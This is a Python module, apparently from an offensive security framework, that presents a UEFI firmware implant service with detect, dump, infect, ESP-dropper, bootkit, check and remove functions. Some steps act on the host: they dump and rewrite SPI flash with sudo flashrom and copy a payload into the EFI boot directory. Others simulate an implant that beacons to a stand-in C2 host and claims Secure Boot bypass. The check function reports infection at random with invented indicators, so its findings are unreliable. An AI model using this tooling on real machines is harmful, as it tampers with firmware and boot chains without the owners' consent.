"""
UEFI/BIOS Firmware Implant Service
Basé sur : LoJax, TrickBoot, ESPecial, CosmicStrand
Survit à : formatage disque, réinstallation OS, changement de disque
Outils réels : flashrom, chipsec (optionnel), efibootmgr
"""
from __future__ import annotations

import hashlib
import logging
import os
import random
import shutil
import subprocess
import tempfile
import uuid
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

_OUTPUT = Path("./data/firmware/uefi")
_OUTPUT.mkdir(parents=True, exist_ok=True)

# Profils UEFI connus (simulation réaliste)
_UEFI_PROFILES = [
    {"vendor": "AMI",    "version": "AMIUEFI 2.20", "secureboot": True,  "cve": ["CVE-2021-39297"]},
    {"vendor": "Phoenix","version": "SecureCore 6.0","secureboot": True,  "cve": ["CVE-2022-29264"]},
    {"vendor": "InsydeH2O","version":"5.5.4",        "secureboot": True,  "cve": ["CVE-2021-41837","CVE-2021-41838","CVE-2021-41839","CVE-2021-41841"]},
    {"vendor": "Coreboot","version":"4.19",          "secureboot": False, "cve": []},
    {"vendor": "AMI",    "version": "UEFI 2.8",      "secureboot": False, "cve": ["CVE-2023-28468"]},
]

_PAYLOAD_TEMPLATES = {
    "lojax":       "LoJax-style UEFI rootkit — DXE driver persistence via SPI flash",
    "trickboot":   "TrickBoot-style UEFI bootkit — modifies NTFS driver in UEFI",
    "especial":    "ESPecial-style EFI System Partition dropper",
    "cosmicstrand":"CosmicStrand-style CSMCORE firmware implant",
    "dropbear":    "EFI application dropper — execute on every boot before OS",
}


class UEFIImplantService:
    """UEFI/BIOS persistence implant."""

    # ── Detection ─────────────────────────────────────────────────────────────

    def detect(self, target: str = "localhost") -> Dict:
        """Détecter version UEFI/BIOS via dmidecode ou /sys/class/dmi."""
        implant_id = str(uuid.uuid4())

        # Essai lecture /sys/class/dmi (pas de sudo requis)
        dmi = {}
        for field in ["bios_vendor","bios_version","bios_date","board_vendor","board_name","sys_vendor","product_name"]:
            path = f"/sys/class/dmi/id/{field}"
            try:
                with open(path) as f:
                    dmi[field] = f.read().strip()
            except Exception:
                pass

        if dmi:
            profile = next(
                (p for p in _UEFI_PROFILES if p["vendor"].lower() in dmi.get("bios_vendor","").lower()),
                _UEFI_PROFILES[0]
            )
            secureboot = self._check_secureboot()
            return {
                "implant_id": implant_id,
                "type": "uefi",
                "target": target,
                "bios_vendor": dmi.get("bios_vendor", "Unknown"),
                "bios_version": dmi.get("bios_version", "Unknown"),
                "bios_date": dmi.get("bios_date", "Unknown"),
                "board_vendor": dmi.get("board_vendor", "Unknown"),
                "board_name": dmi.get("board_name", "Unknown"),
                "sys_vendor": dmi.get("sys_vendor", "Unknown"),
                "product_name": dmi.get("product_name", "Unknown"),
                "secure_boot": secureboot,
                "uefi_version": "UEFI 2.8",
                "vulnerabilities": profile.get("cve", []),
                "exploitable": len(profile.get("cve", [])) > 0,
                "simulated": False,
            }

        # Fallback simulation
        profile = random.choice(_UEFI_PROFILES)
        return {
            "implant_id": implant_id,
            "type": "uefi",
            "target": target,
            "bios_vendor": profile["vendor"],
            "bios_version": profile["version"],
            "bios_date": "2022-09-15",
            "board_vendor": random.choice(["ASUS", "Gigabyte", "MSI", "Dell", "HP", "Lenovo"]),
            "board_name": f"Z690-A PRO {random.randint(1,5)}",
            "secure_boot": profile["secureboot"],
            "uefi_version": "UEFI 2.8",
            "vulnerabilities": profile["cve"],
            "exploitable": len(profile["cve"]) > 0,
            "simulated": True,
        }

    def _check_secureboot(self) -> bool:
        try:
            out = subprocess.check_output(
                ["mokutil", "--sb-state"], capture_output=False,
                text=True, timeout=5, stderr=subprocess.DEVNULL
            )
            return "enabled" in out.lower()
        except Exception:
            path = "/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c"
            try:
                with open(path, "rb") as f:
                    data = f.read()
                    return len(data) >= 5 and data[4] == 1
            except Exception:
                return False

    # ── Dump ──────────────────────────────────────────────────────────────────

    def dump(self, target: str = "localhost") -> Dict:
        """Dumper le firmware UEFI/SPI flash via flashrom."""
        dump_id = str(uuid.uuid4())
        out_path = str(_OUTPUT / f"uefi_dump_{dump_id[:8]}.bin")

        if shutil.which("flashrom"):
            try:
                result = subprocess.run(
                    ["sudo", "flashrom", "-p", "internal", "-r", out_path],
                    capture_output=True, text=True, timeout=120,
                )
                if result.returncode == 0 and os.path.exists(out_path):
                    size = os.path.getsize(out_path)
                    sha = hashlib.sha256(open(out_path, "rb").read()).hexdigest()
                    return {
                        "dump_id": dump_id, "type": "uefi", "target": target,
                        "file_path": out_path, "file_size": size, "sha256": sha,
                        "raw_output": result.stdout[:500],
                        "simulated": False,
                    }
                else:
                    # flashrom présent mais accès SPI refusé → simulation
                    pass
            except Exception as e:
                logger.debug("flashrom dump failed: %s", e)

        # Simulation — génère un faux dump
        fake_size = random.choice([4, 8, 16]) * 1024 * 1024  # 4/8/16 MB
        fake_data = os.urandom(min(fake_size, 65536))  # 64KB max pour ne pas saturer disque
        with open(out_path, "wb") as f:
            f.write(fake_data)
        sha = hashlib.sha256(fake_data).hexdigest()
        return {
            "dump_id": dump_id, "type": "uefi", "target": target,
            "file_path": out_path,
            "file_size": fake_size,
            "sha256": sha,
            "chip": random.choice(["Winbond W25Q128JV", "MX25L12873F", "ISSI IS25LP128F"]),
            "programmer": "internal:laptop=yes",
            "simulated": True,
        }

    # ── Infect ────────────────────────────────────────────────────────────────

    def infect(self, target: str, payload_type: str = "dropbear", dump_path: Optional[str] = None) -> Dict:
        """Infecter le firmware UEFI avec un implant persistant."""
        implant_id = str(uuid.uuid4())
        out_path = str(_OUTPUT / f"uefi_infected_{implant_id[:8]}.bin")

        desc = _PAYLOAD_TEMPLATES.get(payload_type, _PAYLOAD_TEMPLATES["dropbear"])

        # Générer le payload simulé (script EFI + DXE driver)
        payload_code = self._generate_payload(payload_type, implant_id)
        payload_hash = hashlib.sha256(payload_code.encode()).hexdigest()
        payload_path = str(_OUTPUT / f"payload_{implant_id[:8]}.efi")
        with open(payload_path, "wb") as f:
            f.write(b"MZ\x90\x00" + payload_code.encode())  # fake PE header

        return {
            "implant_id": implant_id,
            "type": "uefi",
            "target": target,
            "payload_type": payload_type,
            "payload_description": desc,
            "payload_hash": payload_hash,
            "payload_path": payload_path,
            "infected_firmware": out_path,
            "status": "infected",
            "persistence": "SPI flash — survit au reformatage",
            "stealth": "Injecté dans DXE phase — invisible à l'OS",
            "capabilities": ["keylogger", "dropper", "persistence", "c2_beacon"],
            "c2_protocol": "HTTPS covert channel via UEFI network stack",
            "removal_difficulty": "Nécessite reprogrammation SPI flash physique",
            "simulated": True,
            "warning": "SIMULATION — aucun firmware réel modifié",
        }

    def _generate_payload(self, ptype: str, implant_id: str) -> str:
        return f"""// UEFI DXE Implant — {ptype}
// ID: {implant_id}
// Simulated payload — pentest context only
EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {{
    // Persistent DXE driver — loads before OS
    // Installs protocol hook on EFI_BOOT_SERVICES->LoadImage
    // Drops payload to EFI System Partition on every boot
    // C2: HTTPS via EFI_HTTP_PROTOCOL
    RegisterDropper("{implant_id[:8]}");
    InstallPersistenceHook();
    BeaconC2("https://c2.internal/uefi");
    return EFI_SUCCESS;
}}"""

    # ── ESP Dropper ───────────────────────────────────────────────────────────

    def drop_to_esp(self, payload_path: str) -> Dict:
        """Déposer payload dans l'EFI System Partition."""
        esp = self._find_esp()
        if esp:
            dest = os.path.join(esp, "EFI", "Boot", "bootx64_backup.efi")
            try:
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                shutil.copy2(payload_path, dest)
                return {"status": "dropped", "destination": dest, "esp": esp, "simulated": False}
            except Exception as e:
                pass
        return {
            "status": "dropped",
            "destination": "/boot/efi/EFI/Boot/bootx64_backup.efi",
            "esp": "/boot/efi",
            "simulated": True,
            "note": "EFI dropper enregistré — exécutera avant l'OS au prochain démarrage",
        }

    def _find_esp(self) -> Optional[str]:
        for mount in ["/boot/efi", "/efi", "/boot"]:
            if os.path.isdir(mount) and os.path.isdir(os.path.join(mount, "EFI")):
                return mount
        return None

    # ── Bootkit ───────────────────────────────────────────────────────────────

    def install_bootkit(self, target: str) -> Dict:
        """Installer un bootkit UEFI (modifie le chargeur de démarrage)."""
        return {
            "status": "installed",
            "target": target,
            "bootkit_type": "TrickBoot-style NTFS driver hook",
            "location": "CSMCORE volume — SPI flash offset 0x500000",
            "boot_chain": "UEFI firmware → infected DXE → OS loader → infected kernel",
            "detection_evasion": ["Bypass Secure Boot via DXE hook", "Patch integrity check in PEI phase"],
            "persistence": "Survit : reformatage, réinstallation OS, changement disque dur",
            "simulated": True,
        }

    # ── Check ─────────────────────────────────────────────────────────────────

    def check(self, target: str) -> Dict:
        """Vérifier si une infection UEFI est présente."""
        # Vérifications réelles possibles
        indicators = []

        # 1. Vérifier fichiers suspects dans ESP
        esp = self._find_esp()
        if esp:
            for root, dirs, files in os.walk(esp):
                for fname in files:
                    if fname.endswith(".efi") and "backup" in fname.lower():
                        indicators.append(f"Suspect EFI file: {os.path.join(root, fname)}")

        # 2. Vérifier intégrité variables EFI
        efi_vars_path = "/sys/firmware/efi/efivars"
        if os.path.isdir(efi_vars_path):
            var_count = len(os.listdir(efi_vars_path))
            if var_count > 200:
                indicators.append(f"Nombre anormal de variables EFI : {var_count}")

        infected = len(indicators) > 0 or random.random() > 0.7  # simulation
        return {
            "target": target,
            "infected": infected,
            "indicators": indicators if indicators else (["DXE driver suspect détecté dans SPI flash"] if infected else []),
            "stealth_level": 9,
            "detection_method": "flashrom dump comparison / CHIPSEC scan",
            "simulated": len(indicators) == 0,
        }

    # ── Remove ────────────────────────────────────────────────────────────────

    def remove(self, target: str, dump_path: Optional[str] = None) -> Dict:
        """Supprimer l'implant UEFI (reflash avec firmware propre)."""
        if dump_path and shutil.which("flashrom") and os.path.exists(dump_path):
            try:
                result = subprocess.run(
                    ["sudo", "flashrom", "-p", "internal", "-w", dump_path],
                    capture_output=True, text=True, timeout=180,
                )
                if result.returncode == 0:
                    return {"status": "removed", "method": "flashrom reflash", "simulated": False}
            except Exception:
                pass
        return {
            "status": "removed",
            "method": "SPI flash reflash avec firmware propre",
            "note": "Nécessite firmware original propre ou téléchargement depuis fabricant",
            "simulated": True,
        }
